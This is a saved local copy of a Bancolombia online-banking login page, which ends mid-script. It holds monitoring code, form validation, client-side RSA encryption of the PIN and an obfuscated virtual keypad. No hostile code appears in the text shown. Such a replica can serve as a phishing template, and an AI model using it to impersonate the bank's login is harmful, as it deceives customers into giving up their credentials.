<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<!-- saved from url=(0167) -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">



  <title>Bancolombia Sucursal Virtual Personas</title>
  
  
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Todo1">
  <meta name="author" content="Todo1 Services">
  <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved.">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  

  
<script type="text/javascript" src="./index2_files/017cf77fef"></script><script src="./index2_files/nr-1071.min.js"></script><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"VQcBWVVaABADV1RbDwYCVQ=="};window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,n,e){r(e.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,n){return t}).join(", ")))},{}],2:[function(t,n,e){function r(t,n,e,r,s){try{p?p-=1:o(s||new UncaughtException(t,n,e),!0)}catch(f){try{i("ierr",[f,c.now(),!0])}catch(d){}}return"function"==typeof u&&u.apply(this,a(arguments))}function UncaughtException(t,n,e){this.message=t||"Uncaught error with no additional information",this.sourceURL=n,this.line=e}function o(t,n){var e=n?null:c.now();i("err",[t,e])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=t("gos"),u=window.onerror,d=!1,l="nr@seenError",p=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(h){"stack"in h&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),d=!0)}s.on("fn-start",function(t,n,e){d&&(p+=1)}),s.on("fn-err",function(t,n,e){d&&!e[l]&&(f(e,l,function(){return!0}),this.thrown=!0,o(e))}),s.on("fn-end",function(){d&&!this.thrown&&p>0&&(p-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,n,e){t("loader").features.ins=!0},{}],4:[function(t,n,e){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState",g=t("loader");g.features.stn=!0,t(6);var b=NREUM.o.EV;o.on(m,function(t,n){var e=t[0];e instanceof b&&(this.bstStart=g.now())}),o.on(w,function(t,n){var e=t[0];e instanceof b&&i("bst",[e,n,this.bstStart,g.now()])}),a.on(m,function(t,n,e){this.bstStart=g.now(),this.bstType=e}),a.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),this.bstType])}),s.on(m,function(){this.bstStart=g.now()}),s.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=g.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,n,e){function r(t){for(var n=t;n&&!n.hasOwnProperty(u);)n=Object.getPrototypeOf(n);n&&o(n)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,n){return t[1]}var a=t("ee").get("events"),s=t(18)(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";n.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,n){var e=t[1],r=c(e,"nr@wrapped",function(){function t(){if("function"==typeof e.handleEvent)return e.handleEvent.apply(e,arguments)}var n={object:t,"function":e}[typeof e];return n?s(n,"fn-",null,n.name||"anonymous"):e});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],6:[function(t,n,e){var r=t("ee").get("history"),o=t(18)(r);n.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,n,e){var r=t("ee").get("raf"),o=t(18)(r),i="equestAnimationFrame";n.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,n,e){function r(t,n,e){t[0]=a(t[0],"fn-",null,e)}function o(t,n,e){this.method=e,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,e)}var i=t("ee").get("timer"),a=t(18)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";n.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,n,e){function r(t,n){d.inPlace(n,["onreadystatechange"],"fn-",s)}function o(){var t=this,n=u.context(t);t.readyState>3&&!n.resolved&&(n.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,y,"fn-",s)}function i(t){g.push(t),h&&(x?x.then(a):w?w(a):(E=-E,O.data=E))}function a(){for(var t=0;t<g.length;t++)r([],g[t]);g.length&&(g=[])}function s(t,n){return n}function c(t,n){for(var e in t)n[e]=t[e];return n}t(5);var f=t("ee"),u=f.get("xhr"),d=t(18)(u),l=NREUM.o,p=l.XHR,h=l.MO,m=l.PR,w=l.SI,v="readystatechange",y=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],g=[];n.exports=u;var b=window.XMLHttpRequest=function(t){var n=new p(t);try{u.emit("new-xhr",[n],n),n.addEventListener(v,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(r){}}return n};if(c(p,b),b.prototype=p.prototype,d.inPlace(b.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,n){r(t,n),i(n)}),u.on("open-xhr-start",r),h){var x=m&&m.resolve();if(!w&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===v||a()})},{}],10:[function(t,n,e){function r(t){var n=this.params,e=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!n.aborted){if(e.duration=a.now()-this.startTime,4===t.readyState){n.status=t.status;var i=o(t,this.lastSize);if(i&&(e.rxSize=i),this.sameOrigin){var c=t.getResponseHeader("X-NewRelic-App-Data");c&&(n.cat=c.split(", ").pop())}}else n.status=0;e.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[n,e,this.startTime])}}}function o(t,n){var e=t.responseType;if("json"===e&&null!==n)return n;var r="arraybuffer"===e||"blob"===e||"json"===e?t.response:t.responseText;return h(r)}function i(t,n){var e=c(n),r=t.params;r.host=e.hostname+":"+e.port,r.pathname=e.pathname,t.sameOrigin=e.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var n=this;n.totalCbs=0,n.called=0,n.cbTime=0,n.end=r,n.ended=!1,n.xhrGuids={},n.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){n.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,n){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,n){var e=this.metrics,r=t[0],o=this;if(e&&r){var i=h(r);i&&(e.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof n.onload))&&o.end(n)}catch(e){try{f.emit("internal-error",[e])}catch(r){}}};for(var s=0;s<d;s++)n.addEventListener(u[s],this.listener,!1)}),f.on("xhr-cb-time",function(t,n,e){this.cbTime+=t,n?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof e.onload||this.end(e)}),f.on("xhr-load-added",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&!this.xhrGuids[e]&&(this.xhrGuids[e]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&this.xhrGuids[e]&&(delete this.xhrGuids[e],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],n)}),f.on("removeEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],n)}),f.on("fn-start",function(t,n,e){n instanceof m&&("onload"===e&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,n){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,n],n)})}},{}],11:[function(t,n,e){n.exports=function(t){var n=document.createElement("a"),e=window.location,r={};n.href=t,r.port=n.port;var o=n.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=n.hostname||e.hostname,r.pathname=n.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!n.protocol||":"===n.protocol||n.protocol===e.protocol,a=n.hostname===document.domain&&n.port===e.port;return r.sameOrigin=i&&(!n.hostname||a),r}},{}],12:[function(t,n,e){function r(){}function o(t,n,e){return function(){return i(t,[f.now()].concat(s(arguments)),n?null:this,e),n?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",p=l+"ixn-";a(d,function(t,n){u[n]=o(l+n,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),n.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,n){var e={},r=this,o="function"==typeof n;return i(p+"tracer",[f.now(),t,e],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],e),o)try{return n.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],e),t}finally{c.emit("fn-end",[f.now()],e)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,n){h[n]=o(p+n)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now()])}},{}],13:[function(t,n,e){n.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(n){return}}}},{}],14:[function(t,n,e){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),n.exports=r},{}],15:[function(t,n,e){function r(t,n){var e=[],r="",i=0;for(r in t)o.call(t,r)&&(e[i]=n(r,t[r]),i+=1);return e}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],16:[function(t,n,e){function r(t,n,e){n||(n=0),"undefined"==typeof e&&(e=t?t.length:0);for(var r=-1,o=e-n||0,i=Array(o<0?0:o);++r<o;)i[r]=t[n+r];return i}n.exports=r},{}],17:[function(t,n,e){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],18:[function(t,n,e){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;n.exports=function(t,n){function e(t,n,e,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof e?e(r,a):e||{}}catch(f){l([f,"",[r,a,o],s])}u(n+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(n+"err",[r,a,d],s),d}finally{u(n+"end",[r,a,c],s)}}return r(t)?t:(n||(n=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function u(e,r,o){if(!c||n){var i=c;c=!0;try{t.emit(e,r,o,n)}catch(a){l([a,e,r,o])}c=i}}function d(t,n){if(Object.defineProperty&&Object.keys)try{var e=Object.keys(t);return e.forEach(function(e){Object.defineProperty(n,e,{get:function(){return t[e]},set:function(n){return t[e]=n,n}})}),n}catch(r){l([r])}for(var o in t)s.call(t,o)&&(n[o]=t[o]);return n}function l(n){try{t.emit("internal-error",n)}catch(e){}}return t||(t=o),e.inPlace=f,e.flag=a,e}},{}],ee:[function(t,n,e){function r(){}function o(t){function n(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function e(e,r,o,i){if(!l.aborted||i){t&&t(e,r,o);for(var a=n(o),s=h(e),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[y[e]];return d&&d.push([g,e,r,a]),a}}function p(t,n){v[t]=h(t).concat(n)}function h(t){return v[t]||[]}function m(t){return d[t]=d[t]||o(e)}function w(t,n){f(t,function(t,e){n=n||"feature",y[e]=n,n in u||(u[n]=[])})}var v={},y={},g={on:p,emit:e,get:m,listeners:h,context:n,buffer:w,abort:a,aborted:!1};return g}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var s="nr@context",c=t("gos"),f=t(15),u={},d={},l=n.exports=o();l.backlog=u},{}],gos:[function(t,n,e){function r(t,n,e){if(o.call(t,n))return t[n];var r=e();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[n]=r,r}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(t,n,e){function r(t,n,e,r){o.buffer([t],r),o.emit(t,n,e)}var o=t("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(t,n,e){function r(t){var n=typeof t;return!t||"object"!==n&&"function"!==n?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");n.exports=r},{}],loader:[function(t,n,e){function r(){if(!x++){var t=b.info=NREUM.info,n=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&n))return u.abort();f(y,function(n,e){t[n]||(t[n]=e)}),c("mark",["onload",a()+b.offset],null,"api");var e=l.createElement("script");e.src="https://"+t.agent,n.parentNode.insertBefore(e,n)}}function o(){"complete"===l.readyState&&i()}function i(){c("mark",["domContent",a()+b.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=t("handle"),f=t(15),u=t("ee"),d=window,l=d.document,p="addEventListener",h="attachEvent",m=d.XMLHttpRequest,w=m&&m.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:m,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},g=m&&w&&w[p]&&!/CriOS/.test(navigator.userAgent),b=n.exports={offset:s,now:a,origin:v,features:{},xhrWrappable:g};t(12),l[p]?(l[p]("DOMContentLoaded",i,!1),d[p]("load",r,!1)):(l[h]("onreadystatechange",o),d[h]("onload",r)),c("mark",["firstbyte",s],null,"api");var x=0,E=t(17)},{}]},{},["loader",2,10,4,3]);</script><link href="./index2_files/styles.css" media="all" rel="stylesheet" type="text/css">
  <link href="./index2_files/bootstrap.css" media="all" rel="stylesheet" type="text/css"> 
  <link href="./index2_files/keyboard_util.css" rel="stylesheet" type="text/css">
   
  <!--[if lt IE 8]>
    <link href="/mua/css/bootstrap-ie7.css" rel="stylesheet">
<![endif]-->

      <!--[if lt IE 9]>
      <script src="/mua/js/html5shiv.js"></script>
      <script src="/mua/js/respond.min.js"></script>
   <![endif]-->
	

	<script type="text/javascript" src="./index2_files/jquery-1.10.1.js"></script>
	<script type="text/javascript" src="./index2_files/jquery.validate-1.11.1.js"></script>
	<script type="text/javascript" src="./index2_files/validations.js"></script>
	<script type="text/javascript" src="./index2_files/jquery-validations.js"></script>
	<script type="text/javascript" src="./index2_files/blockKeys.js"></script>
	
	<script type="text/javascript" src="./index2_files/jquery-ui.js"></script>

	<link href="./index2_files/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="./index2_files/ui.css" media="all" rel="stylesheet" type="text/css">
   

   

	<script type="text/javascript" src="./index2_files/jsbn2.js"></script>
	<script type="text/javascript" src="./index2_files/prng4.js"></script>
	<script type="text/javascript" src="./index2_files/rng.js"></script>
	<script type="text/javascript" src="./index2_files/rsa.js"></script>
	<script type="text/javascript" src="./index2_files/base64.js"></script>
	<script type="text/javascript" src="./index2_files/rsa-t1.js"></script>
	<script language="JavaScript">
	var t1Assertion="0.6527741338943983";
	function processPassword(password){var rsa = new RSAKey();rsa.setPublic("A6CA1BB4BD803E5704A071E8F7370FD68F2A42CAB574A765693F0F54796CB8AD2CF1B624005119FE651227F7992FF6A6D1979C9B72EA0EAD789F1CBADAB9851779CB8F5F82F40BC71C5C303A10298ED6DC5657E3401AE5720F06836F098366441AC30AB35F13FAB8B6CE81955A1181FCA0AD4EA471CC09C51EAE8EDA42E8C615F933483449CBC67883F407430CB856E4EEC1919BFDD38850CCF5837EC67D8CF802EC30836099592FCDB6CEF4D4AB8EC7F95229B6B262DC6F9A62BFD082CCF98D8FC73FADFA2CCBDDBD17126206E0EC41FE85ECDB9B7631A7EDEF193E4971ADA3E4AB3FFE05F5146907255AD29D0AFB91160C95E225514E1CD07E35BA157A44D1", "10001");var res2 = rsa.encrypt(password + "|" + t1Assertion);return hex2b64(res2);}  
	</script>
   
<script language="javascript">
$(document).ready(function() {	
function obtenerError(message){
	return "<script>document.getElementById('summary').innerHTML='"+message+"'; document.getElementById('tabError').style.display='';</"+"script>";
}
var validator = $("#loginUserForm").bind("invalid-form.validate", function() {		
}).validate({
onsubmit: false,
onkeyup: false,
onclick: false,
onfocusout: false,
rules: {
errorContainer: $("#summary"),
password:{
required:true,
"passwordLength":true
}
},
messages: {
password: {
required:       obtenerError('Por favor ingrese su clave'),
passwordLength: obtenerError('La clave no cumple con los requerimientos m&iacute;nimos de seguridad, por favor intente nuevamente.')
}
}
});
});
function reloadValidate(contError) {	
$("#contentError").html(contError);
}
</script>
   <script type="text/javascript" src="./index2_files/bootstrap.js"></script>

	<script language="JavaScript" type="text/javascript" src="./index2_files/AC_OETags.js"></script>
	
	<script language="JavaScript" type="text/javascript" src="./index2_files/keyboard.js"></script>
	<script language="JavaScript" type="text/javascript" src="./index2_files/layer_lib_util.js"></script>
	
	



<script language="JavaScript">
function addEventsButton(id_button){
var IE = navigator.appName=="Microsoft Internet Explorer";
if( navigator.userAgent.match( /iPad/i ) ) {
document.getElementById(id_button).addEventListener('touchstart', function(){recoveryPassword();xwsMXhPOVpJx();document.authenticationForm.userId.value = '0';  return nGBUHBysYZJw();}, false);
}
else if(IE){
document.getElementById(id_button).attachEvent('onclick', function(){recoveryPassword(); dfXGzwoqUaVV(); document.authenticationForm.userId.value = '0';  return nGBUHBysYZJw();});
document.getElementById(id_button).attachEvent('onmouseover', function(){xwsMXhPOVpJx();});
document.getElementById(id_button).attachEvent('onmouseout', function(){FFUdxPsahgih();});
}else{
document.getElementById(id_button).addEventListener('click', function(){recoveryPassword(); dfXGzwoqUaVV(); document.authenticationForm.userId.value = '0';  return nGBUHBysYZJw();}, false);
document.getElementById(id_button).addEventListener('mouseover', function(){xwsMXhPOVpJx();}, false);
document.getElementById(id_button).addEventListener('mouseout', function(){FFUdxPsahgih();}, false);
}
}
function clearByError(){
if(document.forms[0].userId.value == '' || isEmpty(passwordMinLength[0]) || (passwordMinLength[0] < DEF_MAXLENGTH - 1)){
clearKeys();
document.forms[0].password.value='';
}
}

function validateAndClear(){
var validate = nGBUHBysYZJw();
if (isNaN(validate) || validate == null || validate == false){
if( navigator.userAgent.match( /iPad/i ) ) {
clearByErrorIpad();
} else {
clearByError();
}
return false;	
}
return true;
}

function clearByErrorIpad(){
document.forms[0].userId.value='';
document.forms[0].password.value='';
document.forms[0].tempUserID.value='';
return true;
}
function addEventsButtonSinCero(id_button){
var IE = navigator.appName=="Microsoft Internet Explorer";
if( navigator.userAgent.match( /iPad/i ) ) {
document.getElementById(id_button).addEventListener('touchstart', function(){recoveryPassword(); xwsMXhPOVpJx(); if(validateAndClear()){validateForm();}}, false);
}
else if(IE){

document.getElementById(id_button).attachEvent('onmouseover', function(){dfXGzwoqUaVV();});
document.getElementById(id_button).attachEvent('onmouseout', function(){changeToOrigKeyboard();});
}else{

document.getElementById(id_button).addEventListener('mouseover', function(){dfXGzwoqUaVV();}, false);
document.getElementById(id_button).addEventListener('mouseout', function(){changeToOrigKeyboard();}, false);
}
}
var ASnRWWqasAVo = [{'PASSWORD':'OUnxqkYYMyKy'}][0];
function changePass(name) {
	return ( ASnRWWqasAVo[name.toUpperCase()] );
}
var passwordMinLength = new Array();
var omitformtags=["input", "textarea", "select"]
omitformtags=omitformtags.join("|")
var maxLengthKeyboard;
var origKeyboardShown = true;
var contrastLevel= "2";
var fontSizeDefault=12;
var indexField = 0;
var isOpen = false;
var isLayer = false;
var KEYCONTENT = '';
var DEF_MAXLENGTH = 4;
var UbxwxKyfBvQb = new Array();
var kxXgpRmBxEuE = new Array();
var maxLengthKeyboard = DEF_MAXLENGTH;
var regFunction;
var Pwd="";
function startKeyb(elem, index, modal) {        if (UbxwxKyfBvQb[indexField]) {      	      UbxwxKyfBvQb[indexField].disabled = false;         }       bindElement(elem);  	WsUEJoylUxkb(index);       if (!isOpen && isLayer) {  	     activateChild(isOpen = true);      }         if(modal)  {              UbxwxKyfBvQb[indexField].disabled = true;       }   }
function changeConstrastImage(){     var mykey = document.getElementById('constrastImg');       mykey.src='./images/kb/Contraste.gif'     }
function clearUserID(){    	document.loginUserForm.tempUserID.value='';        	document.loginUserForm.userId.value='';    }
function EDKCIlUFEGBq(){      	KEYCONTENT = "  <table class='keyboard' border='0' cellspacing='0' cellpadding='0' align='left' valign='top'>  <tr>    <td width='0' height='20' ></td>    <td></td>  </tr>  <tr>    <td height='0' width='0'></td>    <td colspan='2'>      <table align='left' valign='top' cellspacing='0' cellpadding='0' class='bg_button'>        <tr align='left'>                  <td valign='top' align='left'> <table class='bg_button' id='_KEYBRD' valign='top' >  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"f8HB\");'>  <div border='0' id ='MdAlmdXlJcrY6' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>6</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"bYQN\");'>  <div border='0' id ='MdAlmdXlJcrY8' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>8</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"eMZJ\");'>  <div border='0' id ='MdAlmdXlJcrY7' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>7</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"FLnm\");'>  <div border='0' id ='MdAlmdXlJcrY5' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>5</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"4la3\");'>  <div border='0' id ='MdAlmdXlJcrY2' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>2</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"j0i2\");'>  <div border='0' id ='MdAlmdXlJcrY1' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>1</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"7cdS\");'>  <div border='0' id ='MdAlmdXlJcrY9' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>9</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"CGI6\");'>  <div border='0' id ='MdAlmdXlJcrY4' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>4</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"R9Uk\");'>  <div border='0' id ='MdAlmdXlJcrY3' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>3</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='dfXGzwoqUaVV();' onmouseout='changeToOrigKeyboard();' onclick='XCWHoiKCqmIk(\"KP1W\");'>  <div border='0' id ='MdAlmdXlJcrY0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>0</div></td><td colspan='2' onclick='clearKeys();' class='bg_buttonSmall'><div id='clearKey' border='0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>Borrar</div></td></tr></table><table class='bg_button' id='_CONSTRAST' valign='top' cellspacing='0'>  <tr><td><img width='90' height='34' border='0' src='./images/kb/Contraste.gif' name='constrastImg' id='constrastImg' usemap='#numericKeyboardMap' > <map name='numericKeyboardMap' id='numericKeyboardMap'><area shape='circle' class='cursorContrast' coords='10,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(1)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='50,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(2)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='90,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(3)' onmouseout='setDefaultCursor(document.constrastImg)'></map></td></tr></table></td>        </tr>      </table>    </td>  </tr><tr>    <td height='17'></td>    <td colspan='2'></td>  </tr> </table>";        	return KEYCONTENT;    }
function blockSelect(element) {   	if (typeof element.onselectstart!="undefined"){ 		element.onselectstart=new Function ("event.returnValue=false;  return false; ");   	}else{  		element.onmousedown=disableselect;    		element.onmouseup=reEnable;    	}}
function validBrowser() {      var EX = navigator.appName=="Microsoft Internet Explorer";       if (EX){           var EXversion = navigator.appVersion.substring(navigator.appVersion.indexOf(";")+1);          EXversion = parseFloat(EXversion.substring(0,EXversion.indexOf(";")));             if (EXversion < 5){                return false;              }        }         else {               var EXversion = navigator.appVersion;          var i = EXversion.indexOf("[");               if ( i != -1 || (i= EXversion.indexOf("(")) != -1 )             	EXversion = EXversion.substring(0,i);             	EXversion = parseFloat(EXversion);	              if (EXversion < 5.0){                return false;             }        }      return true;      }
function recoveryPassword(){     	for (i=0; i<UbxwxKyfBvQb.length; i++){	   UbxwxKyfBvQb[i].value = kxXgpRmBxEuE[i].value;    	}}
function closeKeyb(){    	if (isLayer) activateChild(isOpen = false);     UbxwxKyfBvQb[indexField].disabled = false;        }
function hideUserID(){     var x = document.loginUserForm.tempUserID.value;         if (x !== "" && x !== "****************"){  		document.loginUserForm.userId.value = x;     		document.loginUserForm.tempUserID.value = "****************";  	}   }		
